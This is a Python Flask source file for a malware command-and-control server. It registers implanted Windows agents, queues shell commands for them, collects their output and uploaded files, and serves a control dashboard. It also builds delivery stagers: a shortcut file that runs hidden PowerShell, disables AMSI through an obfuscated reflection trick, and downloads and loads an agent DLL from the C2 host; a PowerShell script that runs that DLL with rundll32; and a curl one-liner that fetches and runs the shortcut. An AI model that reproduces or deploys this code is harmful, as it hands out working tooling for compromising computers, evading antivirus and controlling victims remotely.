import json
import os
import uuid
import base64
import secrets
import subprocess
import tempfile
from datetime import datetime, timezone
from functools import wraps
from flask import Flask, request, jsonify, render_template, abort, send_file, session, redirect, url_for
import logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
log = logging.getLogger("werkzeug")
log.setLevel(logging.INFO)
from models import db, Agent, Task
from crypto_helper import encrypt, decrypt, get_aes_key

DLL_PATH = "agent/target/x86_64-pc-windows-msvc/release/c2_agent.dll"
LNK_CACHE = None

with open("config.json") as f:
    CONFIG = json.load(f)

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///c2.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db.init_app(app)

@app.before_request
def log_request():
    if request.path.startswith("/api/"):
        info = f"  >>> {request.method} {request.path}"
        if request.method == "POST":
            info += f" body={request.get_data(as_text=True)[:200]}"
        log.info(info)

AES_KEY = get_aes_key(CONFIG["aes_key_hex"])


def require_master_key(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if request.headers.get("X-API-Key") != CONFIG["api_key"]:
            abort(401)
        return f(*args, **kwargs)

    return wrapper


def require_agent_token(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        token = request.headers.get("X-Agent-Token")
        if not token:
            abort(401)
        agent = Agent.query.filter_by(token=token).first()
        if not agent:
            abort(401)
        agent.last_seen = datetime.now(timezone.utc)
        agent.status = "alive"
        db.session.commit()
        request.agent = agent
        return f(*args, **kwargs)

    return wrapper


def decrypt_body() -> dict:
    data = request.get_json(force=True)
    ct = data.get("ct", "")
    if not ct:
        abort(400)
    try:
        return json.loads(decrypt(ct, AES_KEY))
    except Exception:
        abort(400)


def encrypt_body(payload: dict) -> dict:
    return {"ct": encrypt(json.dumps(payload), AES_KEY)}


def generate_lnk() -> bytes:
    global LNK_CACHE
    if LNK_CACHE:
        return LNK_CACHE

    c2 = CONFIG["c2_url"]

    ps1 = f'''$ws = New-Object -ComObject WScript.Shell
$p = [IO.Path]::GetTempFileName() + ".lnk"
$lnk = $ws.CreateShortcut($p)
$lnk.TargetPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
$a = '-w hidden -c "$u=''{c2}/api/stager/dll'';$t=$env:TEMP+''\\d_''+[guid]::NewGuid().ToString(''N'')+''.dll'';(New-Object Net.WebClient).DownloadFile($u,$t);$a=''System.Management.Automation.A'';$b=''msiUtils'';[PSObject].Assembly.GetType($a+$b).GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true);[Runtime.InteropServices.Marshal]::LoadLibrary($t)|Out-Null;Remove-Item $t -Force -EA 0;Start-Sleep -s 86400"'
$lnk.Arguments = $a
$lnk.WindowStyle = 7
$lnk.WorkingDirectory = "C:\\Windows\\System32"
$lnk.IconLocation = "C:\\Windows\\System32\\imageres.dll,0"
$lnk.Save()
$b = [IO.File]::ReadAllBytes($p)
Remove-Item $p
[Console]::Write([Convert]::ToBase64String($b))
'''
    with tempfile.NamedTemporaryFile(mode="w", suffix=".ps1", delete=False) as f:
        f.write(ps1)
        tmp = f.name
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-File", tmp],
            capture_output=True, text=True, timeout=15,
        )
        if r.returncode != 0:
            raise RuntimeError(f"LNK generation failed: {r.stderr.strip()}")
        LNK_CACHE = base64.b64decode(r.stdout.strip())
        return LNK_CACHE
    finally:
        os.unlink(tmp)


@app.route("/stager.lnk", methods=["GET"])
def stager_lnk():
    try:
        data = generate_lnk()
        return data, 200, {"Content-Type": "application/octet-stream",
                           "Content-Disposition": "attachment; filename=u.lnk"}
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/agent/register", methods=["POST"])
@require_master_key
def agent_register():
    payload = decrypt_body()
    agent = Agent(
        hostname=payload.get("hostname", "unknown"),
        username=payload.get("username", "unknown"),
        os=payload.get("os", "unknown"),
        ip=request.remote_addr or "0.0.0.0",
        token=uuid.uuid4().hex,
    )
    db.session.add(agent)
    db.session.commit()
    return jsonify(
        encrypt_body({"agent_id": agent.id, "token": agent.token})
    )


@app.route("/api/agent/poll", methods=["POST"])
@require_agent_token
def agent_poll():
    payload = decrypt_body()
    if payload.get("agent_id") != request.agent.id:
        abort(403)

    tasks = Task.query.filter_by(
        agent_id=request.agent.id, status="pending"
    ).all()
    tasks_data = [
        {"id": t.id, "type": t.type, "command": t.command} for t in tasks
    ]
    for t in tasks:
        t.status = "running"
    db.session.commit()

    return jsonify(encrypt_body({"tasks": tasks_data}))


@app.route("/api/agent/result", methods=["POST"])
@require_agent_token
def agent_result():
    payload = decrypt_body()
    task = Task.query.filter_by(
        id=payload["task_id"], agent_id=request.agent.id
    ).first()
    if not task:
        abort(404)

    task.status = "done" if payload.get("exit_code", -1) == 0 else "failed"
    task.stdout = payload.get("stdout", "")
    task.stderr = payload.get("stderr", "")
    task.exit_code = payload.get("exit_code", -1)
    task.completed_at = datetime.now(timezone.utc)
    db.session.commit()

    return jsonify(encrypt_body({"status": "ok"}))


@app.route("/api/agent/upload", methods=["POST"])
@require_agent_token
def agent_upload():
    payload = decrypt_body()
    file_path = payload.get("path", "")
    file_data = base64.b64decode(payload.get("data", ""))
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    with open(file_path, "wb") as f:
        f.write(file_data)
    return jsonify(encrypt_body({"status": "ok"}))


@app.route("/api/execute", methods=["POST"])
@require_master_key
def api_execute():
    data = request.get_json(force=True)
    agent = Agent.query.get(data.get("agent_id"))
    if not agent:
        return jsonify({"error": "agent not found"}), 404

    task = Task(
        agent_id=agent.id,
        type=data.get("type", "cmd"),
        command=data.get("command", ""),
    )
    db.session.add(task)
    db.session.commit()
    return jsonify({"task_id": task.id, "status": "queued"})


@app.route("/api/agents", methods=["GET"])
@require_master_key
def api_agents():
    agents = Agent.query.order_by(Agent.last_seen.desc()).all()
    return jsonify(
        [
            {
                "id": a.id,
                "hostname": a.hostname,
                "username": a.username,
                "os": a.os,
                "ip": a.ip,
                "last_seen": a.last_seen.isoformat() if a.last_seen else None,
                "status": a.status,
                "pending_tasks": Task.query.filter_by(
                    agent_id=a.id, status="pending"
                ).count(),
            }
            for a in agents
        ]
    )


@app.route("/api/health", methods=["GET"])
def api_health():
    return jsonify({"status": "ok", "agents": Agent.query.count()})


@app.route("/api/stager/dll", methods=["GET"])
def stager_dll():
    if not os.path.exists(DLL_PATH):
        return jsonify({"error": "DLL not built. Run `cd agent && cargo build --release`"}), 404
    return send_file(DLL_PATH, mimetype="application/octet-stream",
                     as_attachment=True, download_name="c2_agent.dll")


@app.route("/api/stager/ps1", methods=["GET"])
def stager_ps1():
    c2 = CONFIG["c2_url"]
    script = f"""$u = "{c2}/api/stager/dll"
$t = "$env:TEMP\\$([IO.Path]::GetRandomFileName()).dll"
try {{
    (New-Object Net.WebClient).DownloadFile($u, $t)
    Start-Process -WindowStyle Hidden -FilePath "rundll32.exe" -ArgumentList "$t,RunDllEntry"
}} catch {{}}
"""
    return script, 200, {"Content-Type": "text/plain; charset=utf-8"}


@app.route("/api/stager/oneliner", methods=["GET"])
def stager_oneliner():
    c2 = CONFIG["c2_url"]
    inline = f'ping 127.0.0.1 -n 6 >nul && curl -s -o %TEMP%\\u.lnk {c2}/stager.lnk && %TEMP%\\u.lnk'
    return inline, 200, {"Content-Type": "text/plain; charset=utf-8"}


@app.route("/app/dashboard")
def dashboard():
    return render_template("dashboard.html")


@app.route("/app/dashboard/table")
def dashboard_table():
    agents = Agent.query.order_by(Agent.last_seen.desc()).all()
    return render_template("_table.html", agents=agents)


@app.route("/app/dashboard/command", methods=["POST"])
def dashboard_command():
    agent_id = request.form.get("agent_id")
    if not Agent.query.get(agent_id):
        return jsonify({"error": "agent not found"}), 404

    task = Task(
        agent_id=agent_id,
        type=request.form.get("type", "cmd"),
        command=request.form.get("command", ""),
    )
    db.session.add(task)
    db.session.commit()
    return "", 204


# ── LukiLab Dashboard ──────────────────────────────────────────────────

LUKILAB_PASSWORD = "2026"


def require_lukilab(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get("lukilab_auth"):
            return redirect(url_for("lukilab_login"))
        return f(*args, **kwargs)
    return wrapper


@app.route("/lukilab/login", methods=["GET", "POST"])
def lukilab_login():
    if request.method == "POST":
        if request.form.get("password") == LUKILAB_PASSWORD:
            session["lukilab_auth"] = True
            return redirect(url_for("lukilab_dashboard"))
        return render_template("lukilab_login.html", error="Contraseña incorrecta")
    return render_template("lukilab_login.html", error=None)


@app.route("/lukilab/logout")
def lukilab_logout():
    session.pop("lukilab_auth", None)
    return redirect(url_for("lukilab_login"))


@app.route("/lukilab/")
@require_lukilab
def lukilab_dashboard():
    agents = Agent.query.order_by(Agent.last_seen.desc()).all()
    return render_template("lukilab_dashboard.html", agents=agents, c2=CONFIG["c2_url"])


@app.route("/lukilab/agent/<string:agent_id>")
@require_lukilab
def lukilab_agent(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    tasks = Task.query.filter_by(agent_id=agent_id).order_by(Task.created_at.desc()).all()
    return render_template("lukilab_agent.html", agent=agent, tasks=tasks)


@app.route("/lukilab/execute", methods=["POST"])
@require_lukilab
def lukilab_execute():
    agent_id = request.form.get("agent_id")
    command = request.form.get("command", "")
    cmd_type = request.form.get("type", "cmd")
    if not Agent.query.get(agent_id):
        return jsonify({"error": "agent not found"}), 404
    task = Task(agent_id=agent_id, type=cmd_type, command=command)
    db.session.add(task)
    db.session.commit()
    return redirect(url_for("lukilab_agent", agent_id=agent_id))


@app.route("/lukilab/delete/<int:task_id>", methods=["POST"])
@require_lukilab
def lukilab_delete_task(task_id):
    task = Task.query.get(task_id)
    if not task:
        abort(404)
    agent_id = task.agent_id
    db.session.delete(task)
    db.session.commit()
    return redirect(url_for("lukilab_agent", agent_id=agent_id))


@app.route("/lukilab/agent/<agent_id>/delete", methods=["POST"])
@require_lukilab
def lukilab_delete_agent(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    Task.query.filter_by(agent_id=agent_id).delete()
    db.session.delete(agent)
    db.session.commit()
    return redirect(url_for("lukilab_dashboard"))


if __name__ == "__main__":
    with app.app_context():
        db.create_all()

    cert, key = "cert.pem", "key.pem"
    if os.path.exists(cert) and os.path.exists(key):
        app.run(
            host=CONFIG["host"],
            port=CONFIG["port"],
            ssl_context=(cert, key),
            debug=False,
        )
    else:
        print("[!] HTTPS certs not found. Run gen_cert.py first.")
        print(f"[*] Falling back to HTTP on 0.0.0.0:{CONFIG['port']}")
        app.run(host=CONFIG["host"], port=CONFIG["port"], debug=False)
